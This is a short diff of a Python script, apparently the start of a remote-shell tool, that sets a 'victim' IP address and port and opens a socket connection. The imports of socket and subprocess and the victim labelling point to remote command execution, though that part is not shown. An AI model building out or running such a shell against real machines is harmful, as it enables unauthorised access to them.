@@ -2,8 +2,8 @@ import sys
 import socket
 import subprocess
 
-SERVER_IP = 'Input Your Victim IP' 
-PORT = 4444
+SERVER_IP = ' '  # Victims IP Address
+PORT = 10001     #Put A open port
 
 s = socket.socket()
 s.connect((SERVER_IP, PORT))
